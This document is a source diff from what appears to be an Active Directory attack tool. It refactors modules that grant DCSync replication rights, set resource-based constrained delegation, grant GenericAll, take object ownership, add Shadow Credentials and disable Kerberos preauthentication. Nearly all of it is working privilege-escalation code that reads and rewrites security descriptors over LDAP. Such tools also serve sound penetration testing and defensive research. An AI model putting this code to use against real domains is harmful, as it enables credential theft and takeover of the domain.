@@ -10,12 +10,13 @@ from dsinternals.common.cryptography.X509Certificate2 import X509Certificate2
 from dsinternals.system.DateTime import DateTime
 from dsinternals.common.data.hello.KeyCredential import KeyCredential
 from impacket.ldap import ldaptypes
+from impacket.dcerpc.v5 import samr, dtypes
 
 from .exceptions import BloodyError, ResultError, NoResultError
 from .utils import createACE, createEmptySD
 from .utils import resolvDN, getDefaultNamingContext
 from .utils import rpcChangePassword
-from .utils import userAccountControl
+from .utils import userAccountControl, modifySecDesc
 from .utils import LOG
 
 
@@ -56,21 +57,6 @@ def getObjectAttributes(conn, identity):
     attributes = ldap_conn.response[0]['attributes']
     LOG.info(attributes)
     return attributes
-
-
-@register_module
-def getObjectSID(conn, identity):
-    """
-    Get the SID for the given identity
-    Args:
-        identity: sAMAccountName, DN, GUID or SID of the object
-    """
-    ldap_conn = conn.getLdapConnection()
-    object_dn = resolvDN(ldap_conn, identity)
-    ldap_conn.search(object_dn, '(objectClass=*)', attributes='objectSid')
-    object_sid = ldap_conn.entries[0]['objectSid'].raw_values[0]
-    #LOG.info(format_sid(object_sid))
-    return object_sid
 
 def getDefaultPasswordPolicy(conn):
     """
@@ -290,153 +276,6 @@ def getComputersInOu(conn, base_ou):
 
 
 @register_module
-def addDomainSync(conn, identity):
-    """
-    Give the right to perform DCSync with the user provided (You must have write permission on the domain LDAP object)
-    Args:
-        identity: sAMAccountName, DN, GUID or SID of the user
-    """
-    ldap_conn = conn.getLdapConnection()
-
-    user_sid = getObjectSID(conn, identity)
-
-    # Set SD flags to only query for DACL
-    controls = ldap3.protocol.microsoft.security_descriptor_control(sdflags=0x04)
-
-    # print_m('Querying domain security descriptor')
-    ldap_conn.search(getDefaultNamingContext(ldap_conn), '(&(objectCategory=domain))', attributes='nTSecurityDescriptor', controls=controls)
-    
-    entry_dn = ldap_conn.entries[0].entry_dn
-    sd_data = ldap_conn.entries[0]['nTSecurityDescriptor'].raw_values[0]
-
-    sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=sd_data)
-
-    # We need "control access" here for the extended attribute
-    accesstype = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_CONTROL_ACCESS
-
-    # these are the GUIDs of the get-changes and get-changes-all extended attributes
-    sd['Dacl'].aces.append(createACE(user_sid, '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', accesstype))
-    sd['Dacl'].aces.append(createACE(user_sid, '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', accesstype))
-
-    data = sd.getData()
-    ldap_conn.modify(entry_dn, {'nTSecurityDescriptor': (ldap3.MODIFY_REPLACE, [data])}, controls=controls)
-
-
-@register_module
-def delDomainSync(conn, identity):
-    """
-    Give the right to perform DCSync with the user provided (You must have write permission on the domain LDAP object)
-    Args:
-        identity: sAMAccountName, DN, GUID or SID of the user
-    """
-    ldap_conn = conn.getLdapConnection()
-
-    user_sid = getObjectSID(conn, identity)
-
-    # Set SD flags to only query for DACL
-    controls = ldap3.protocol.microsoft.security_descriptor_control(sdflags=0x04)
-
-    # print_m('Querying domain security descriptor')
-    ldap_conn.search(getDefaultNamingContext(ldap_conn), '(&(objectCategory=domain))', attributes='nTSecurityDescriptor', controls=controls)
-    
-    entry_dn = ldap_conn.entries[0].entry_dn
-    sd_data = ldap_conn.entries[0]['nTSecurityDescriptor'].raw_values[0]
-
-    sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=sd_data)
-
-    aces_to_keep = []
-    LOG.debug('Currently allowed sids for domain sync:')
-    for ace in sd['Dacl'].aces:
-        ace_sid = ace['Ace']['Sid']
-        if ace_sid.getData() == user_sid:
-            LOG.debug('    %s (will be removed)' % ace_sid.formatCanonical())
-        else:
-            LOG.debug('    %s' % ace_sid.formatCanonical())
-            aces_to_keep.append(ace)
-
-    sd['Dacl'].aces = aces_to_keep
-    attr_values = [sd.getData()]
-
-    ldap_conn.modify(entry_dn, {'nTSecurityDescriptor': (ldap3.MODIFY_REPLACE, attr_values)}, controls=controls)
-
-
-@register_module
-def addRbcd(conn, spn_id, target_id):
-    """
-    Give Resource Based Constraint Delegation (RBCD) on the target to the SPN provided
-    Args:
-        spn_id: sAMAccountName, DN, GUID or SID of the SPN
-        target_id: sAMAccountName, DN, GUID or SID of the target (You must have DACL write on it)
-    """
-    ldap_conn = conn.getLdapConnection()
-    target_dn = resolvDN(ldap_conn, target_id)
-    spn_sid = getObjectSID(conn, spn_id)
-
-    ldap_conn.search(target_dn, '(objectClass=*)', attributes='msDS-AllowedToActOnBehalfOfOtherIdentity')
-    rbcd_attrs = ldap_conn.entries[0]['msDS-AllowedToActOnBehalfOfOtherIdentity'].raw_values
-
-    if len(rbcd_attrs) > 0:
-        sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=rbcd_attrs[0])
-        LOG.debug('Currently allowed sids:')
-        for ace in sd['Dacl'].aces:
-            LOG.debug('    %s' % ace['Ace']['Sid'].formatCanonical())
-    else:
-        sd = createEmptySD()
-
-    sd['Dacl'].aces.append(createACE(spn_sid))
-    ldap_conn.modify(target_dn, {'msDS-AllowedToActOnBehalfOfOtherIdentity': [ldap3.MODIFY_REPLACE, [sd.getData()]]})
-    if ldap_conn.result['result'] == 0:
-        LOG.info('Delegation rights modified successfully!')
-        LOG.info('%s can now impersonate users on %s via S4U2Proxy', spn_id, target_id)
-    else:
-        raise ResultError(ldap_conn.result)
-
-
-@register_module
-def delRbcd(conn, spn_id, target_id):
-    """
-    Delete Resource Based Constraint Delegation (RBCD) on the target for the SPN provided
-    Args:
-        spn_sid: object SID of the SPN
-        target_id: sAMAccountName, DN, GUID or SID of the target (You must have DACL write on it)
-    """
-    ldap_conn = conn.getLdapConnection()
-    target_dn = resolvDN(ldap_conn, target_id)
-    spn_sid = getObjectSID(conn, spn_id)
-
-    ldap_conn.search(target_dn, '(objectClass=*)', attributes='msDS-AllowedToActOnBehalfOfOtherIdentity')
-    rbcd_attrs = ldap_conn.entries[0]['msDS-AllowedToActOnBehalfOfOtherIdentity'].raw_values
-
-    if len(rbcd_attrs) < 1:
-        LOG.info("The attribute msDS-AllowedToActOnBehalfOfOtherIdentity doesn't exist for %s",target_id)
-        return
-    
-    sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=rbcd_attrs[0])
-    
-    aces_to_keep = []
-    LOG.debug('Currently allowed sids:')
-    for ace in sd['Dacl'].aces:
-        ace_sid = ace['Ace']['Sid']
-        if ace_sid.getData() == spn_sid:
-            LOG.debug('    %s (will be removed)' % ace_sid.formatCanonical())
-        else:
-            LOG.debug('    %s' % ace_sid.formatCanonical())
-            aces_to_keep.append(ace)
-
-    # Remove the attribute if there is no ace to keep
-    if len(aces_to_keep) < 1:
-        attr_values = []
-    else:
-        sd['Dacl'].aces = aces_to_keep
-        attr_values = [sd.getData()]
-
-    ldap_conn.modify(target_dn, {'msDS-AllowedToActOnBehalfOfOtherIdentity': [ldap3.MODIFY_REPLACE, attr_values]})
-    if ldap_conn.result['result'] == 0:
-        LOG.info('Delegation rights modified successfully!')
-    else:
-        raise ResultError(ldap_conn.result)
-
-@register_module
 def addShadowCredentials(conn, identity, outfilePath=None):
     """
     Allow to authenticate as the user provided using a crafted certificate (Shadow Credentials)
@@ -484,7 +323,7 @@ def addShadowCredentials(conn, identity, outfilePath=None):
 @register_module
 def delShadowCredentials(conn, identity):
     """
-    Delete the crafted certificate (Shadow Credentials) from the msDS-KeyCrednetialLink attribute of the user provided
+    Delete the crafted certificate (Shadow Credentials) from the msDS-KeyCredentialLink attribute of the user provided
     Args:
         identity: sAMAccountName, DN, GUID or SID of the target (You must have write permission on it)
     """
@@ -500,34 +339,58 @@ def delShadowCredentials(conn, identity):
 
 
 @register_module
-def modifyGpoACL(conn, identity, gpo):
+def setGenericAll(conn, identity, target, enable="True"):
     """
-    Give permission to a user to modify the GPO
+    Give permission to an AD object to modify the properties of another object
+    Args:
+        identity: sAMAccountName, DN, GUID or SID of the object you control
+        target:  sAMAccountName, GPO name, DN, GUID or SID
+        enable: True to add GenericAll for the user or False to remove it (default is True)
+    """
+    modifySecDesc(conn=conn, identity=identity, target=target, enable=enable)
+    if enable == "True":
+        LOG.info(f'[+] {identity} can now write the attributes of {target}')
+
+
+@register_module
+def setOwner(conn, identity, target):
+    """
+    Set an AD object as the owner of the target object
+    Args:
+        identity: sAMAccountName, DN, GUID or SID of the object you control
+        target: sAMAccountName, DN, GUID or SID of the targeted object (You must have WriteOwner permission on it)
+    """
+    old_sid = modifySecDesc(conn, identity=identity, target=target, control_flag=dtypes.OWNER_SECURITY_INFORMATION)['OwnerSid'].formatCanonical()
+    LOG.info(f'[+] Old owner {old_sid} is now replaced by {identity} on {target}')
+    return old_sid
+
+
+@register_module
+def setRbcd(conn, spn, target, enable="True"):
+    """
+    Set Resource Based Constraint Delegation (RBCD) on the target to the SPN provided
+    Args:
+        spn: sAMAccountName, DN, GUID or SID of the SPN
+        target: sAMAccountName, DN, GUID or SID of the target (You must have DACL write on it)
+        enable: True to add Rbcd and False to remove it (default is True)
+    """
+    modifySecDesc(conn=conn, identity=spn, target=target, ldap_attribute='msDS-AllowedToActOnBehalfOfOtherIdentity', enable=enable)
+    LOG.info('[+] Delegation rights modified successfully!')
+    if enable == "True":
+        LOG.info(f'{spn} can now impersonate users on {target} via S4U2Proxy')
+
+
+@register_module
+def setDCSync(conn, identity, enable='True'):
+    """
+    Set the right to perform DCSync with the user provided (You must have write permission on the domain LDAP object)
     Args:
         identity: sAMAccountName, DN, GUID or SID of the user
-        gpo: name of the GPO (ldap name)
+        enable: True to add DCSync and False to remove it (default is True)
     """
-    ldap_conn = conn.getLdapConnection()
-
-    user_sid = getObjectSID(conn, identity)
-
-    controls = ldap3.protocol.microsoft.security_descriptor_control(sdflags=0x04)
-    ldap_filter = '(&(objectClass=groupPolicyContainer)(name=%s))' % gpo
-    ldap_conn.search(getDefaultNamingContext(ldap_conn), ldap_filter, attributes=['nTSecurityDescriptor'], controls=controls)
-
-    if len(ldap_conn.entries) <= 0:
-        raise NoResultError(getDefaultNamingContext(ldap_conn), ldap_filter)
-    gpo = ldap_conn.entries[0]
-
-    sd_data = gpo['nTSecurityDescriptor'].raw_values[0]
-    sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=sd_data)
-    sd['Dacl'].aces.append(createACE(user_sid))
-
-    ldap_conn.modify(gpo.entry_dn, {'nTSecurityDescriptor': (ldap3.MODIFY_REPLACE, [sd.getData()])}, controls=controls)
-    if ldap_conn.result["result"] == 0:
-        LOG.info('LDAP server claims to have taken the security descriptor. Have fun')
-    else:
-        raise ResultError(ldap_conn.result)
+    modifySecDesc(conn=conn, identity=identity, target=getDefaultNamingContext(conn.getLdapConnection()), ldap_filter='(objectCategory=domain)', enable=enable)
+    if enable == 'True':
+        LOG.info(f'{identity} can now DCSync')
 
         
 @register_module
@@ -539,10 +402,7 @@ def setDontReqPreauthFlag(conn, identity, enable="True"):
         identity: sAMAccountName, DN, GUID or SID of the target
         enable: True to enable DontReqPreAuth for the identity or False to disable it (default is True)
     """
-    ldap_conn = conn.getLdapConnection()
-
-    UF_DONT_REQUIRE_PREAUTH = 4194304
-    userAccountControl(ldap_conn, identity, enable, UF_DONT_REQUIRE_PREAUTH)
+    userAccountControl(conn, identity, enable, samr.UF_DONT_REQUIRE_PREAUTH)
 
 
 @register_module
@@ -554,7 +414,4 @@ def setAccountDisableFlag(conn, identity, enable="False"):
         identity: sAMAccountName, DN, GUID or SID of the target
         enable: True to enable the identity or False to disable it (default is False)
     """
-    ldap_conn = conn.getLdapConnection()
-
-    UF_ACCOUNTDISABLE = 2
-    userAccountControl(ldap_conn, identity, enable, UF_ACCOUNTDISABLE)
+    userAccountControl(conn, identity, enable, samr.UF_ACCOUNTDISABLE)
